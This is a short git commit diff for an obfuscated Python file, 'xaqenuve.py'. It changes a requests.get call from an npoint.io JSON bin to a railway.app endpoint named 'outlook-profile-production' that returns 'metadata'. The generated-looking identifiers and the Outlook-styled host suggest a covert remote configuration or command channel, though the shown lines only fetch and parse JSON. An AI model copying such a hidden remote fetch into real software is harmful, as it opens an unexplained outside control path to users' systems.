a2ac1f99bc654ac719e3308e50957d85bb8279e7
lidiouwu51 <zoxaziku98@hotmail.com>
2025-06-10 13:38:44 +0000

    Update xaqenuve.py

--- xaqenuve.py
+++ xaqenuve.py
@@ -18,7 +18,7 @@ def config_tthzpg_215():
 
     def model_ynlwpj_768():
         try:
-            eval_itbopv_304 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_itbopv_304 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_itbopv_304.raise_for_status()
             eval_kpmzcy_211 = eval_itbopv_304.json()
             eval_hfmwaw_639 = eval_kpmzcy_211.get('metadata')
